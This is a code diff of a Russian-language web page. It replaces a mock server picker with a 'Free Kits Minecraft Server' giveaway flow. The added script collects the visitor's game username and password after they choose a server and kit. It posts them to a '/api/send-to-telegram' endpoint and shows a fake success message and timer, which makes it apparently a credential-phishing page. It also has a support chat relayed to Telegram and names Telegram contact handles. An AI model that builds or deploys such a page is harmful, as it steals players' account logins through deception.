-        servers.forEach(s => {
-            sList.innerHTML += `<div class="item" onclick="sel(this)"><img src="${s.photo}" class="flag"> ${s.name} <span class="ping"><span class="p-val">${Math.floor(Math.random()*30+5)}</span>ms</span></div>`;
-            aList.innerHTML += `<div style="display:flex; justify-content:space-between; margin-bottom:5px;">[SRV] ${s.name} <span onclick="delItem(${s.id}, 'srv')" style="color:red; cursor:pointer;">УДАЛИТЬ</span></div>`;
+        function selectServer(server) {
+            selectedServer = server;
+            selectedKit = '';
+            document.querySelectorAll('.server-btn').forEach(btn => btn.classList.remove('selected'));
+            event.target.classList.add('selected');
+            showKits();
+        }
+
+        function showKits() {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('step3').classList.remove('active');
+            
+            document.getElementById('serverNameDisplay').textContent = serverNames[selectedServer];
+            
+            const kitsContainer = document.getElementById('kitsContainer');
+            kitsContainer.innerHTML = '';
+            
+            kits[selectedServer].forEach(kit => {
+                const button = document.createElement('button');
+                button.className = 'kit-btn';
+                button.innerHTML = `
+                    <span class="kit-emoji">${kit.emoji}</span>
+                    ${kit.name}
+                    <span class="kit-rarity">${kit.rarity}</span>
+                `;
+                button.onclick = () => selectKit(kit.name);
+                kitsContainer.appendChild(button);
+            });
+        }
+
+        function selectKit(kitName) {
+            selectedKit = kitName;
+            document.querySelectorAll('.kit-btn').forEach(btn => btn.classList.remove('selected'));
+            event.target.classList.add('selected');
+            showForm();
+        }
+
+        function showForm() {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+            document.getElementById('finalChoiceDisplay').innerHTML = 
+                `Сервер: <strong>${serverNames[selectedServer]}</strong>, Кит: <strong>${selectedKit}</strong>`;
+        }
+
+        function goToStep1() {
+            selectedServer = '';
+            selectedKit = '';
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.remove('active');
+            document.querySelectorAll('.server-btn, .kit-btn').forEach(btn => btn.classList.remove('selected'));
+        }
+
+        function goToStep2() {
+            selectedKit = '';
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('step3').classList.remove('active');
+            document.querySelectorAll('.kit-btn').forEach(btn => btn.classList.remove('selected'));
+        }
+
+        function startTimer(minutes = 5) {
+            const timerDiv = document.getElementById('timer');
+            const timerDisplay = document.getElementById('timerDisplay');
+            let seconds = minutes * 60;
+            
+            timerDiv.style.display = 'block';
+            if (timerInterval) clearInterval(timerInterval);
+            
+            timerInterval = setInterval(() => {
+                const mins = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                timerDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                if (seconds <= 0) clearInterval(timerInterval);
+                seconds--;
+            }, 1000);
+        }
+
+        function toggleMenu() {
+            const menuPanel = document.getElementById('menuPanel');
+            const menuButton = document.getElementById('menuButton');
+            menuPanel.classList.toggle('show');
+            menuButton.classList.toggle('active');
+        }
+
+        function toggleSnow() {
+            const checkbox = document.getElementById('snowToggle');
+            if (checkbox.checked) {
+                startSnow();
+            } else {
+                stopSnow();
+            }
+        }
+
+        function startSnow() {
+            if (snowInterval) clearInterval(snowInterval);
+            snowInterval = setInterval(createSnowflake, 100);
+        }
+
+        function stopSnow() {
+            if (snowInterval) {
+                clearInterval(snowInterval);
+                snowInterval = null;
+            }
+            document.querySelectorAll('.snowflake').forEach(flake => flake.remove());
+        }
+
+        function createSnowflake() {
+            const snowflake = document.createElement('div');
+            snowflake.classList.add('snowflake');
+            snowflake.innerHTML = '❄️';
+            snowflake.style.left = Math.random() * 100 + '%';
+            snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
+            snowflake.style.fontSize = Math.random() * 10 + 10 + 'px';
+            snowflake.style.opacity = Math.random();
+            document.body.appendChild(snowflake);
+            
+            setTimeout(() => {
+                snowflake.remove();
+            }, 5000);
+        }
+
+        function setColor(color) {
+            document.body.classList.remove('dark');
+            document.querySelectorAll('.color-btn').forEach(btn => btn.classList.remove('selected'));
+            
+            if (color === 'dark') {
+                document.body.classList.add('dark');
+                event.target.classList.add('selected');
+            } else if (color === 'white') {
+                event.target.classList.add('selected');
+            } else if (color === 'blue') {
+                document.body.style.background = 'linear-gradient(135deg, #2196F3 0%, #1976D2 100%)';
+                event.target.classList.add('selected');
+            }
+        }
+
+        function showAbout() {
+            alert('Free Kits Minecraft Server\nВерсия 1.0\n\nМы в Telegram: @HelpimServer\nНаш бот: @FullMicBot');
+        }
+
+        function toggleChat() {
+            const chatBody = document.getElementById('chatBody');
+            chatBody.classList.toggle('minimized');
+            document.getElementById('unreadBadge').style.display = 'none';
+        }
+
+        function addMessage(text, isUser = true) {
+            const chatMessages = document.getElementById('chatMessages');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message ${isUser ? 'user' : 'support'}`;
+            
+            const time = new Date();
+            const timeStr = `${time.getHours().toString().padStart(2, '0')}:${time.getMinutes().toString().padStart(2, '0')}`;
+            
+            messageDiv.innerHTML = `
+                <span>${isUser ? 'Вы: ' : 'Поддержка: '}${text}</span>
+                <div class="message-time">${timeStr}</div>
+            `;
+            
+            chatMessages.appendChild(messageDiv);
+            
+            if (!isUser) {
+                const waitingDiv = document.createElement('div');
+                waitingDiv.className = 'waiting-message';
+                waitingDiv.id = 'waitingMessage';
+                waitingDiv.textContent = 'Ожидайте ответа оператора, скоро поможем решить вашу проблему.';
+                chatMessages.appendChild(waitingDiv);
+            } else {
+                const waitingMsg = document.getElementById('waitingMessage');
+                if (waitingMsg) waitingMsg.remove();
+            }
+            
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
+
+        async function sendSupportMessage() {
+            const input = document.getElementById('chatInput');
+            const text = input.value.trim();
+            
+            if (!text) return;
+            
+            addMessage(text, true);
+            input.value = '';
+            
+            try {
+                await fetch('/api/send-to-telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        type: 'support',
+                        message: text,
+                        username: 'Игрок'
+                    })
+                });
+            } catch (error) {}
+        }
+
+        async function checkNewMessages() {
+            try {
+                const response = await fetch('/api/get-messages');
+                const data = await response.json();
+                
+                if (data.messages && data.messages.length > 0) {
+                    data.messages.forEach(msg => {
+                        if (msg.id > lastMessageId) {
+                            addMessage(msg.text, false);
+                            lastMessageId = msg.id;
+                            
+                            const chatBody = document.getElementById('chatBody');
+                            if (chatBody.classList.contains('minimized')) {
+                                document.getElementById('unreadBadge').style.display = 'inline';
+                            }
+                        }
+                    });
+                }
+            } catch (error) {}
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const messageDiv = document.getElementById('message');
+            
+            if (!username || !password) {
+                messageDiv.textContent = 'Заполните все поля!';
+                messageDiv.className = 'message error show';
+                return;
+            }
+
+            messageDiv.textContent = 'Отправка...';
+            messageDiv.className = 'message show';
+
+            try {
+                const response = await fetch('/api/send-to-telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        username, 
+                        password,
+                        server: serverNames[selectedServer],
+                        kit: selectedKit,
+                        type: 'kit_request'
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    playSuccessSound();
+                    
+                    messageDiv.textContent = '✓ Ура! Спасибо что выбрали нас!';
+                    messageDiv.className = 'message success show';
+                    
+                    startTimer(5);
+                    
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    
+                    setTimeout(() => {
+                        goToStep1();
+                        messageDiv.className = 'message';
+                        document.getElementById('timer').style.display = 'none';
+                        if (timerInterval) clearInterval(timerInterval);
+                    }, 5000);
+                } else {
+                    messageDiv.textContent = '✗ Ошибка отправки';
+                    messageDiv.className = 'message error show';
+                }
+            } catch (error) {
+                messageDiv.textContent = '✗ Ошибка соединения';
+                messageDiv.className = 'message error show';
+            }
         });
-        devices.forEach(d => {
-            dList.innerHTML += `<div class="item" onclick="sel(this)"><img src="${d.photo}" class="flag"> ${d.name}</div>`;
-            aList.innerHTML += `<div style="display:flex; justify-content:space-between; margin-bottom:5px;">[DEV] ${d.name} <span onclick="delItem(${d.id}, 'dev')" style="color:red; cursor:pointer;">УДАЛИТЬ</span></div>`;
-        });
-        localStorage.setItem('vx_srv_v5', JSON.stringify(servers)); localStorage.setItem('vx_dev_v5', JSON.stringify(devices));
-    }
 
-    function addItem() {
-        const t = document.getElementById('adm-type').value; const n = document.getElementById('adm-n').value.toUpperCase(); const p = document.getElementById('adm-p').value;
-        if(!n || !p) return toast("Заполни поля!");
-        if(t === 'srv') servers.push({name:n, photo:p, id:Date.now()}); else devices.push({name:n, photo:p, id:Date.now()});
-        renderAll(); toast("Добавлено!");
-    }
-
-    function delItem(id, type) { if(type === 'srv') servers = servers.filter(x => x.id !== id); else devices = devices.filter(x => x.id !== id); renderAll(); }
-    function sel(el) { el.parentElement.querySelectorAll('.item').forEach(i => i.classList.remove('active-item')); el.classList.add('active-item'); }
-    function toggleMenu() { const m = document.getElementById('menu'); m.style.display = (m.style.display === 'flex') ? 'none' : 'flex'; }
-    function nextTheme() { currentTheme = (currentTheme + 1) % themes.length; document.body.className = themes[currentTheme]; toast("Тема: OK"); }
-    function toggleChat() { const w = document.getElementById('chat-win'); w.style.display = (w.style.display === 'flex') ? 'none' : 'flex'; }
-
-    function sendChat() {
-        if(Date.now() - lastMsg < 2000) return toast("Не спамь!");
-        const i = document.getElementById('chat-in'); if(!i.value) return;
-        document.getElementById('chat-list').innerHTML += `<div><b style="color:var(--main)">${user}:</b> ${i.value}</div>`;
-        i.value = ''; lastMsg = Date.now();
-    }
-
-    function connect() {
-        if(!document.querySelector('#srv-list .active-item')) return toast("Выбери сервер!");
-        document.getElementById('c-btn').style.display = 'none'; document.getElementById('ldr').style.display = 'block';
-        let w = 0; let int = setInterval(() => { w += 2; document.getElementById('p-bar').style.width = w + '%'; if(w>=100){ clearInterval(int); document.getElementById('ldr').style.display='none'; document.getElementById('ok').style.display='block'; toast("CONNECTED"); } }, 80);
-    }
-
-    function updatePings() { document.querySelectorAll('.p-val').forEach(p => p.innerText = Math.max(2, parseInt(p.innerText) + (Math.floor(Math.random()*3)-1))); }
-    setInterval(() => { document.getElementById('chat-list').innerHTML = '<div style="opacity:0.3">Чат очищен...</div>'; }, 30000);
-</script>
+        addMessage('Здравствуйте! Чем могу помочь?', false);
+        initTicker();
+        updateOnline();
+        setInterval(checkNewMessages, 3000);
+    </script>
 </body>
 </html>
